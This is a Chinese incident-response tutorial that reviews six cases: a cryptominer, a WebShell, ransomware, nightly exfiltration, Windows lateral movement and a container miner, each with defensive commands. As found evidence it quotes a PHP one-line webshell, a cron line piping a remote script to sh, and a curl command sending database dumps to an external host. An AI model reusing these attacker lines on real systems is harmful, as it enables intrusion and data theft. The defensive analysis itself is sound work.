---
title: '应急响应实战案例：6 个真实场景的处置流程复盘'
toolId: emergency-response
category: security
description: '用六个贴近现场的应急响应案例讲清处置流程：挖矿木马杀了又活、WebShell 清了又出现、勒索病毒差点被重启毁掉证据、夜间异常外连、Windows 域内横向移动、容器镜像里的矿机。每个案例从告警现象、判断依据、分阶段处置命令到复盘教训完整还原，附通用处置顺序与常见误区'
keywords: [应急响应, 应急响应案例, 入侵排查, 挖矿木马, 勒索病毒, WebShell, 数据泄露, 横向移动, 容器安全, 应急处置流程, 安全事件复盘, Linux应急, Windows应急]
author: 开发工具箱
date: 2026-09-21
updated: 2026-11-05
phase: 1
relatedTools: [system-log-analyzer, windows-event-id, linux-commands, windows-commands, tcpdump, security-ports]
relatedTutorials: [system-log-analyzer, windows-event-id, intranet-pentest, tcpdump]
---

## 六份复盘记录，没有一份是「一条命令搞定」的

去年把手头六份应急处置记录翻出来对了一遍，发现一个挺尴尬的共同点：没有一次是查到问题、敲一条命令、收工。最贵的代价全都不是技术难度，而是**顺序错了**——有人先 `kill -9` 再想起来要留样本，有人删了后门文件却没清计划任务，两台机器隔了十分钟又活过来，还有人差点把勒索现场重启掉，内存里唯一一份密钥痕迹就没了。

所以这篇不谈概念，直接讲六个处置过的场景。每个案例都按当时的顺序写：先看到什么、怎么判断、按什么阶段动手、哪一步返了工。命令都是现场能跑的，路径和 IP 换成你自己的即可。

站里的 [应急响应工具箱](/tools/security/emergency-response) 就是按这套顺序做的：选系统、选场景、按阶段列命令，还能一键生成报告草稿。文章负责讲「为什么是这个顺序」，工具负责现场别漏项。

> 所有案例里的 IP、主机名、账号都做了脱敏，操作只适用于你拥有合法授权的资产。真实事件请按单位流程上报、留存证据链。

## 先把处置顺序定下来

工具箱把命令分成五个阶段：识别与确认、遏制隔离、根除清理、恢复加固、溯源取证。实战里我会做两处调整——把「保全」从最后的溯源阶段**提前到遏制之前**，最后再补一步复盘。于是变成六步：

<figure class="dg-figure" data-interval="2100" data-steps='[{"t":"识别与确认","d":"看清发生了什么、影响了几台机器。进程、账号、网络、启动项四个维度一个都不能少。"},{"t":"证据保全","d":"在动手之前，把进程列表、连接、日志、样本只读导出。kill 和 rm 都不可逆。"},{"t":"遏制隔离","d":"断网、封 IP、禁账号，先把火关掉，保留自己的运维通道。"},{"t":"根除清理","d":"清进程之外，还要清计划任务、服务、启动项，更要修掉最初进来的那个入口。"},{"t":"恢复验证","d":"从干净备份或基线恢复，观察一段时间，确认它不会复活。"},{"t":"复盘与溯源","d":"整理时间线、IOC 与泄露面，补上配置与权限上的窟窿。"}]'>
<svg viewBox="0 0 820 540" role="img" aria-label="应急响应通用处置流程：识别确认、证据保全、遏制隔离、根除清理、恢复验证、复盘溯源" text-anchor="middle" dominant-baseline="central">
<defs><marker id="m1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="currentColor" fill-opacity=".55"/></marker><marker id="m1p" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" style="fill:var(--color-primary);fill-opacity:.85"/></marker></defs>
<g class="dg-pop" data-step="0">
<rect class="dg-box-p" x="130" y="24" width="560" height="44" rx="9"/>
<circle class="dg-xor" cx="165" cy="46" r="15"/><text class="dg-op" x="165" y="46">1</text>
<text class="dg-tb" text-anchor="start" x="195" y="42">识别与确认</text><text class="dg-ts" text-anchor="start" x="195" y="60">看清发生了什么、影响了几台机器</text>
</g>
<g data-step="1" data-flow="1"><path class="dg-line" d="M410,68 V107" marker-end="url(#m1)"/></g>
<g class="dg-pop" data-step="1">
<rect class="dg-box" x="130" y="110" width="560" height="44" rx="9"/>
<circle class="dg-xor" cx="165" cy="132" r="15"/><text class="dg-op" x="165" y="132">2</text>
<text class="dg-tb" text-anchor="start" x="195" y="128">证据保全</text><text class="dg-ts" text-anchor="start" x="195" y="146">先只读导出进程 / 连接 / 日志 / 样本，别急着 kill 和 rm</text>
</g>
<g data-step="2" data-flow="1"><path class="dg-line" d="M410,154 V193" marker-end="url(#m1)"/></g>
<g class="dg-pop" data-step="2">
<rect class="dg-box" x="130" y="196" width="560" height="44" rx="9"/>
<circle class="dg-xor" cx="165" cy="218" r="15"/><text class="dg-op" x="165" y="218">3</text>
<text class="dg-tb" text-anchor="start" x="195" y="214">遏制隔离</text><text class="dg-ts" text-anchor="start" x="195" y="232">断网 · 封 IP · 禁账号，同时留着自己的运维通道</text>
</g>
<g data-step="3" data-flow="1"><path class="dg-line" d="M410,240 V279" marker-end="url(#m1)"/></g>
<g class="dg-pop" data-step="3">
<rect class="dg-box" x="130" y="282" width="560" height="44" rx="9"/>
<circle class="dg-xor" cx="165" cy="304" r="15"/><text class="dg-op" x="165" y="304">4</text>
<text class="dg-tb" text-anchor="start" x="195" y="300">根除清理</text><text class="dg-ts" text-anchor="start" x="195" y="318">清进程 + 计划任务 / 服务 / 启动项 + 修掉入口</text>
</g>
<g data-step="4" data-flow="1"><path class="dg-line" d="M410,326 V365" marker-end="url(#m1)"/></g>
<g class="dg-pop" data-step="4">
<rect class="dg-box" x="130" y="368" width="560" height="44" rx="9"/>
<circle class="dg-xor" cx="165" cy="390" r="15"/><text class="dg-op" x="165" y="390">5</text>
<text class="dg-tb" text-anchor="start" x="195" y="386">恢复验证</text><text class="dg-ts" text-anchor="start" x="195" y="404">从干净基线恢复，观察一段时间确认不复活</text>
</g>
<g data-step="5" data-flow="1"><path class="dg-line-p" d="M410,412 V451" marker-end="url(#m1p)"/></g>
<g class="dg-pop" data-step="5">
<rect class="dg-box-g" x="130" y="454" width="560" height="44" rx="9"/>
<circle class="dg-xor" cx="165" cy="476" r="15"/><text class="dg-op" x="165" y="476">✓</text>
<text class="dg-tb" text-anchor="start" x="195" y="472">复盘与溯源</text><text class="dg-ts" text-anchor="start" x="195" y="490">时间线 · IOC · 泄露面，补上配置与权限的窟窿</text>
</g>
</svg>
<figcaption>图 1：应急响应的通用处置顺序。保全必须排在遏制之前，根除一定要连入口一起修，恢复后还要观察是否复活。点上面的「播放」可以看每一步是怎么推进的。</figcaption>
</figure>

「先取证、后清理，先遏制、再根除」这十六个字，下面六个案例里至少有三个是因为没照做而返工的。

## 案例一：挖矿木马杀了又活，persist 藏在两个地方

**背景**：`web-node-07`（10.20.8.17，对外跑 Nginx），凌晨 3:12 CPU 告警，SSH 登录发卡。值班同事上机器敲了 `top -b -n1 | head -15`，排第一的不是业务进程：

```text
  PID USER      %CPU COMMAND
18422 root       387 /usr/bin/kworkerds --pool stratum+tcp://45.77.x.x:3333
```

名字故意装成内核工作线程，但 `/usr/bin/` 下不该有这个东西。`ss -antup | grep ESTABLISHED` 里一条 `10.20.8.17:51234 → 45.77.x.x:3333`，3333 是矿池常见端口，基本可以判定是挖矿。

**第一次处置（失败）**：他直接 `kill -9 18422`，CPU 掉下来，写了句「已处理」。八分钟后告警又响，同一个进程、同一个矿池地址。

**重新按流程走**：

1. **保全**，这步之前补做：`ps -eo pid,ppid,cmd,%cpu --sort=-%cpu > /evidence/ps.txt`、`ss -antup > /evidence/ss.txt`、`crontab -l > /evidence/cron.txt`。
2. **找持久化**：`crontab -l` 里有一行 `*/5 * * * * /usr/lib/.cache/.sys/upd >/dev/null 2>&1`；再查 `systemctl list-unit-files --state=enabled | grep -i updater`，又冒出一个 `sys-updater.service` 配 `sys-updater.timer`。两处都在，只删一处必然复活。顺手看 `/root/.ssh/authorized_keys`，多了一把注释为 `redis-backup` 的公钥。
3. **遏制**：`iptables -A OUTPUT -p tcp --dport 3333 -j DROP`、`systemctl stop sys-updater.timer`，先断矿池外连和定时器，再谈杀进程。
4. **根除**：`cp -a /usr/lib/.cache/.sys /evidence/` 留样本后删除目录，清掉 crontab 那行、禁用并删除 unit 文件、`kill -9` 残留进程、删掉那把公钥。
5. **修入口**：回头查才发现 Redis 6379 暴露在公网且没设密码，攻击者通过写 crontab 落地的。给 Redis 加 `requirepass`、`bind 127.0.0.1`，防火墙只放行内网；`mount -o remount,noexec /tmp` 防止再从临时目录拉脚本。
6. **验证与复盘**：观察半小时 CPU 稳定在 5% 以内，`systemctl list-timers` 无残留。报告里写清楚：入口是 Redis 未授权，不是 SSH 弱口令——这两者加固方向完全不同。

**教训**：`kill` 是整个流程里最没用的一步。进程只是结果，定时器和入口才是原因。

## 案例二：WebShell 删了又出现，访问日志才是关键证据

**背景**：周二 14:20，商城站客服反馈「订单页偶尔弹赌博广告」。站点是 Nginx + PHP-FPM，代码在 git 里，但 `uploads` 目录是运行期写入的。

**现象**：先翻访问日志，不做任何改动：

```bash
grep -i "POST" /var/log/nginx/access.log | grep " 200 " | tail -30
```

一条很扎眼：

```text
203.0.113.44 - - [03/Nov/2026:14:07:31 +0800] "POST /uploads/2026/11/logo.php HTTP/1.1" 200 42
```

上传目录里的 `.php` 返回 200，本身就是事故。`find /var/www/html -type f -newermt '-7 days'` 找到 `/var/www/html/uploads/2026/11/logo.php`，内容是一句话木马 `<?php @eval($_POST['x']);`。

**第一次处置（不完整）**：按「先隔离别删」的原则 `mv` 到 `/quarantine/` 并 `chmod 000`，站也临时停了。两小时后同目录又出现一个同名文件，只是内容换了。

**重新按流程走**：

1. **保全**：`tar czf /evidence/www-$(date +%s).tar.gz /var/www/html`、`cp /var/log/nginx/access.log /evidence/`。这两份是后面唯一定位入口的依据。
2. **遏制**：在 Nginx 配置里加一条 `location ~ ^/uploads/.*\.php$ { deny all; }` 并 reload，比停整站温和，业务没断。
3. **找谁在下发**：`grep -i "logo.php" /var/log/nginx/access.log` 看到另一个 IP 每隔十分钟访问一次；再查 `/etc/cron.d/`，有个叫 `cdn-sync` 的文件，内容是 `*/10 * * * * curl -s http://45.xx.x.x/t.txt | sh`。这才是「删了又出现」的原因。另外 `grep -rl '<?php' /var/www/html/uploads --include='*.jpg'` 还揪出一个藏在图片里的一句话木马。
4. **根除**：删 `cdn-sync`，把后门和图片马移进隔离区，`diff -r <干净备份> /var/www/html/` 对比出全部被篡改文件，从 git 重新部署站点代码。
5. **修入口**：上传接口原来只校验 `Content-Type`，改成服务端白名单后缀 + 重命名 + 存到非 Web 可访问目录；`uploads` 目录彻底禁止 PHP 执行；上传文件加文件完整性监控。
6. **验证与复盘**：全量扫一遍危险函数 `grep -rniE "eval\(|base64_decode|system\(" /var/www --include='*.php'`，连续观察三天访问日志。报告里附上 14:07:31 那条 POST 作为初始入侵时间点。

**教训**：删文件不等于清理。访问日志能告诉你「谁、什么时候、从哪个接口传上来的」，这个一旦被轮转掉，入口就只能靠猜。工具箱的 WebShell 场景把「打包整站 + 备份日志」放在最前面，就是这个原因。

## 案例三：勒索病毒，差点被一次重启毁掉证据

**背景**：周五 17:40，财务共享服务器（Windows Server 2019，10.20.3.9）上的文件名集体变成 `.lockbit`，桌面多出 `RESTORE-MY-FILES.txt`。有人提议「先重启试试」，还有人想装个杀毒全盘扫描。

这两个动作都被拦下了。**取证之前不重启**：内存里可能还留着加密进程和密钥痕迹，重启一次全丢；杀毒全盘扫会改写大量文件时间。

**处置流程**：

1. **隔离但不重启**：拔网线 / 禁用网卡，同一 VLAN 的其它机器也暂停访问这个共享；禁用被怀疑的账号，封禁来源 IP。
2. **保全**：`wevtutil epl Security C:\evidence\sec.evtx`、`wevtutil epl System C:\evidence\sys.evtx`；复制勒索信和两三个加密样本；`Get-Process | Select-Object Id,ProcessName,Path,StartTime > C:\evidence\proc.txt`；`vssadmin list shadows` 的结果也记下来。
3. **查入口**：`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625,4624,4672} -MaxEvents 100 | Format-List TimeCreated, Id, Message`，看到前一天 22:10 起一批 4625，22:14 有一条 `LogonType=10` 的 4624 来自境外 IP，紧跟着 4672。RDP 直接暴露公网 + 弱口令，路径很清楚。`wevtutil qe System /q:"*[System[(EventID=7045)]]" /f:text /c:10` 还查到一个陌生服务被装上。卷影副本已经被 `vssadmin delete shadows` 删掉了，所以本地恢复这条路直接放弃。
4. **评估恢复路径**：确认三天前的异地离线备份可用，先在隔离环境里试恢复两三个目录，验证文件能正常打开，再决定全量恢复。没有自己去乱试网上找来的解密器，避免二次破坏。付款这件事从头到尾没进过方案。
5. **恢复**：保全做完后才做干净重装（注意，是重装系统，不是前面那次被拦下的「重启试试」），从备份还原数据，重置域内所有相关口令，公网 RDP 关掉改走 VPN + MFA，同时把 445/3389 的暴露面复查一遍。
6. **复盘**：入口是 RDP 弱口令，扩散靠共享盘写权限过大。报告里附了 4625→4624→4672 的时间线，以及卷影被删的证据。

**教训**：「重启」和「重装」是两件事——取证前绝对不能重启，保全完之后才谈干净重装。另外勒索处置里最容易被忽略的是**同网段其它主机**，共享盘开着，隔离做慢一步就会多躺几台。

## 案例四：夜间 23GB 外发，短连接靠 ss 是抓不到的

**背景**：连续三晚 02:00 左右，出口防火墙告警：`db-report-02`（10.20.6.31）对外发了约 23GB。白天登上去 `ss -antup | grep ESTABLISHED` 干干净净，一度以为是防火墙误报。

**判断**：白天空窗说明是短连接，靠瞬时快照抓不到。改成抓包 + 看定时任务：

```bash
tcpdump -i any -w /evidence/cap.pcap   # 抓 10 分钟
crontab -l; ls -la /etc/cron.d/
```

`/etc/cron.d/report-sync` 里有个每 30 分钟跑一次的脚本 `/opt/scripts/sync_report.sh`。打开一看，正常的备份逻辑后面被人插了一行：

```bash
tar czf - /var/lib/mysql/dump | curl -s -X POST --data-binary @- https://<外部域名>/u
```

也就是说不是数据库被拖库，是每日 dump 被打包外传。`grep -i "sync_report" /var/log/auth.log` 显示前一天有异常 sudo 操作改过这个脚本。

**处置流程**：

1. **保全**：抓包文件、脚本原文、`tar czf /evidence/varlog.tgz /var/log/`，外加 `stat` 记录的脚本 mtime。
2. **遏制**：注释掉 cron 条目，出站规则里封掉那个域名解析到的 IP；临时把这台机器的出站改成白名单，只留必要的备份目标。
3. **根除**：从 git 恢复 `sync_report.sh`，轮换数据库账号与应用密钥，在其它主机上 `grep -r "data-binary\|/u" /opt/scripts/ /etc/cron.d/` 找同款植入。
4. **评估泄露面**：dump 里有哪几个库、多少行数据、是否含个人信息，按单位流程判断要不要合规上报。这一步常被漏掉，但往往是整个事件里最需要交代清楚的部分。
5. **加固**：出站默认拒绝、脚本纳入文件完整性校验、sudo 操作纳入审计、`curl` 这类外传命令加告警。

**教训**：短连接场景里 `ss` 是盲的，得抓包或从定时任务倒推。封 IP 之前先看清楚是哪个进程发起的，否则换个域名就继续传。这类排查思路在 [系统日志分析](/tutorials/system-log-analyzer) 那篇里展开得更细。

## 案例五：一个服务账号，五分钟里出现在四台 Windows 主机上

**背景**：周一 09:10，域控告警 `svc_backup` 在短时间内从多台主机发起登录。单看一台机器的 Security 日志，只会以为「备份任务跑了一下」。

**现象**：把四台主机的日志拉到一起看，模式就很清楚了——`4625` 一小段洪流之后，`4624` 出现一条 `LogonType=3`，紧跟 `4672`，再往后是 `4648`（显式凭据）。`wevtutil qe System /q:"*[System[(EventID=7045)]]" /f:text /c:10` 在其中三台上查到 `PSEXESVC`，说明有人用 psexec 类的手法推过东西；`4698` 有新建计划任务，`5145` 显示大量共享遍历。

只在一台机器上查，会严重低估影响面。这也是我后来坚持「先按账号和源 IP 跨主机关联」的原因。

**处置流程**：

1. **保全**：四台主机的 `wevtutil epl Security ...` / `wevtutil epl System ...` 分别导出，别只导告警那台。
2. **遏制**：禁用 `svc_backup`、隔离跳板机、封禁源 IP；确认这个账号没有正在跑的关键任务，避免一禁把备份业务停掉需要提前打招呼。
3. **根除**：删除 `PSEXESVC` 服务与新建的计划任务，检查各机 `net localgroup administrators` 有没有被加人，清掉后门账号。
4. **恢复**：重置该账号以及它可能接触过的所有凭据，补齐缺失补丁，重新开放备份任务但限制登录来源。
5. **复盘**：一个备份服务账号凭什么能登四台机器、还能装服务？最后收敛了它的登录权限与组归属，并给「同一账号短时间多主机登录」加了告警。

**教训**：横向移动的特征不在单条记录里，在**同一账号跨主机的重复出现**。要查某个 ID 到底什么意思，用 [Windows 事件 ID 速查](/tools/security/windows-event-id)；把这些事件串成链条，用 [系统日志分析器](/tools/security/system-log-analyzer)。

## 案例六：容器里的矿机，从宿主机视角才看得全

**背景**：K8s 集群某个节点 load 异常，`api-gateway-7d9f...` 这个 Pod 的 CPU 一直顶着。值班同学第一反应是 `kubectl exec` 进去 `kill`，被拦下了——容器命名空间里看不到宿主机全局，而且删 Pod 之前什么都没留，等于把证据一起删了。

**判断**：先在宿主机上看：

```bash
docker stats --no-stream         # 或 crictl ps + crictl stats
ps auxf | grep -iE 'xmrig|stratum|miner'
```

`xmrig` 进程的父进程是 `containerd-shim`，确认来源在容器里。再 `kubectl get pod api-gateway-7d9f... -o yaml`，两个配置很刺眼：`privileged: true`、`hostPath: /`；镜像写的是 `docker.io/randomuser/nginx:latest`，不是官方源。容器里还有个 crontab 每隔几分钟拉矿机，因为挂了宿主根目录，它连宿主机的 crontab 都改得动。

**处置流程**：

1. **保全**：`docker inspect <容器> > /evidence/inspect.json`、`kubectl get pod ... -o yaml > /evidence/pod.yaml`、`docker save` 导出镜像、宿主机进程与 crontab 快照。
2. **遏制**：`kubectl cordon <node>` 先把节点标记为不可调度，封矿池 IP；**先别 delete pod**，等证据留完。
3. **根除**：删除 deployment，清宿主机被改的 crontab，`kubectl get pods -A -o jsonpath` 找其它节点上有没有同一个镜像，清理私有仓库里的可疑 tag。
4. **恢复**：换成可信基础镜像并接入镜像扫描，去掉 `privileged` 和 `hostPath`，加 `runAsNonRoot`，收敛谁有权限创建特权 Pod 的 RBAC。
5. **复盘**：这个 deployment 是谁提交的、CI 里为什么允许 `latest` tag 和任意镜像源，比清一个矿机重要得多。

**教训**：容器不是安全边界。 privileged + hostPath 一旦给了，宿主机就是它的宿主机。工具箱里「容器入侵」场景特意把命令放在宿主机视角，就是这个道理。

## 六个案例，第一个动作其实不一样

把六次处置的第一动作摊开看，最容易犯的错就是拿同一套开头去套所有事件：

<figure class="dg-figure">
<svg viewBox="0 0 820 370" role="img" aria-label="应急响应中常见的错误第一动作与案例里的正确处置顺序对照" text-anchor="middle" dominant-baseline="central">
<defs><marker id="m2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="currentColor" fill-opacity=".55"/></marker></defs>
<g>
<rect class="dg-box-w" x="24" y="50" width="360" height="210" rx="10"/>
<text class="dg-tb" x="204" y="80">下意识动作，基本都会返工</text>
<text class="dg-ts" x="44" y="112" text-anchor="start">挖矿：直接 kill -9 → 八分钟后复活</text>
<text class="dg-ts" x="44" y="136" text-anchor="start">WebShell：只删那个 php → 定时任务又下回来</text>
<text class="dg-ts" x="44" y="160" text-anchor="start">勒索：重启 / 全盘杀毒 → 内存与样本没了</text>
<text class="dg-ts" x="44" y="184" text-anchor="start">外连：只封一个 IP → 换个域名继续传</text>
<text class="dg-ts" x="44" y="216" text-anchor="start">共同点：先动了结果，没查原因和入口</text>
</g>
<g>
<rect class="dg-box-p" x="436" y="50" width="360" height="210" rx="10"/>
<text class="dg-tb" x="616" y="80">案例里实际先做的事</text>
<text class="dg-ts" x="456" y="112" text-anchor="start">先 ps / ss / crontab 留快照再动手</text>
<text class="dg-ts" x="456" y="136" text-anchor="start">先打包整站与 access.log 再隔离文件</text>
<text class="dg-ts" x="456" y="160" text-anchor="start">先断网保内存与勒索信，坚决不重启</text>
<text class="dg-ts" x="456" y="184" text-anchor="start">先抓包定位进程与通道，再封禁</text>
<text class="dg-ts" x="456" y="216" text-anchor="start">先定影响面，再谈杀进程和删文件</text>
</g>
<g><path class="dg-line" d="M204,260 V292" marker-end="url(#m2)"/><path class="dg-line" d="M616,260 V292" marker-end="url(#m2)"/></g>
<g>
<rect class="dg-box-g" x="170" y="296" width="480" height="44" rx="9"/>
<text class="dg-tb" x="410" y="314">先取证、后清理，先遏制、再根除</text>
<text class="dg-ts" x="410" y="332">工具箱五阶段：识别 / 遏制 / 根除 / 恢复 / 溯源</text>
</g>
</svg>
<figcaption>图 2：六个案例里最容易做错的第一动作与正确顺序的对照。不同事件的第一动作并不相同，但有一条是共通的——动手之前先把现场留下来。</figcaption>
</figure>

顺带一提，工具箱每个场景都按「识别与确认 / 遏制隔离 / 根除清理 / 恢复加固 / 溯源取证」五阶段给两套系统的命令，还能一键复制整阶段或整场景、生成 Markdown 报告草稿。现场真正难的是别漏项，这部分交给清单更稳。

## 常见问题（FAQ）

**Q：案例里的命令能直接照抄吗？**
不能整段照抄。`<PID>`、IP、路径、站点根目录、容器名都要换成你的实际值，而且 `ifdown eth0`、`crontab -r` 这类破坏性动作要先确认后果。工具箱按场景列的是完整清单，命令本身都是常见可用的，但顺序和替换项得自己把关。

**Q：为什么反复强调「先保全」？**
三个理由：事后要写报告、要判断入口、要评估泄露面，全都依赖现场数据；`kill -9` 和 `rm -f` 不可逆；很多单位出了事还有合规举证要求。保全的成本只是几条导出命令，返工的代价往往是一整晚。

**Q：为什么杀掉进程还会复活？**
因为进程只是结果。常见复活点至少三处：`crontab`（含 `/etc/cron.d/`、`/var/spool/cron`）、systemd service / timer、`rc.local` 或注册表 Run 键；再加上 SSH 公钥、被改的启动脚本。案例一和案例二都是栽在这上面。更根本的是**入口没修**——Redis 未授权还开着，第二天换批 IP 又来一次。

**Q：断网卡把自己 SSH 也断掉怎么办？**
这是最后一招，别当首选。优先用 `iptables -A INPUT -s <恶意IP> -j DROP` 只封来源，或只拦出站保留运维通道；云服务器还能走带外 / VNC。案例三用的是拔网线，但那台机器本来就在机房、有人能到场，条件不同别硬套。

**Q：勒索要不要付赎金、能不能重启？**
不付款，付了也不保证拿回数据。取证之前不能重启；保全完内存、日志、样本、勒索信之后，恢复阶段该做的是**干净重装 + 从离线备份还原**，这跟「重启试试」完全是两回事。先确认备份可用再动，别把唯一的恢复路径也覆盖掉。

**Q：Linux 和 Windows 的处置流程一样吗？**
阶段一样，命令完全不同。Linux 靠 `ps` / `ss` / `crontab` / `journalctl`，Windows 靠 `Get-Process` / `Get-NetTCPConnection` / `schtasks` / 事件日志。工具箱里每个场景都备了两套，选系统切换即可。Windows 事件日志怎么读，可以看 [事件 ID 速查教程](/tutorials/windows-event-id)。

## 相关工具

- [应急响应工具箱](/tools/security/emergency-response)：本篇配套工具，按系统 + 场景 + 五阶段给命令，支持一键复制与报告导出
- [系统日志分析器](/tools/security/system-log-analyzer)：把多源日志串成攻击时间线，[案例化教程](/tutorials/system-log-analyzer)
- [Windows 事件 ID 速查](/tools/security/windows-event-id)：查 4624 / 4672 / 7045 / 1102 的含义与字段
- [Linux 常用命令](/tools/security/linux-commands) / [Windows 常用命令](/tools/security/windows-commands)：命令语法速查
- [安全常见端口](/tools/security/security-ports) / [Iptables 命令生成器](/tools/security/iptables) / [Tcpdump 命令生成器](/tools/security/tcpdump)：识别矿池端口、封禁来源、断网前抓包

应急处置永远在授权范围内进行，遵循「先取证、后清理，先遏制、再根除」。这些案例和工具箱都是参考，真实现场请结合自己系统的实际情况判断。
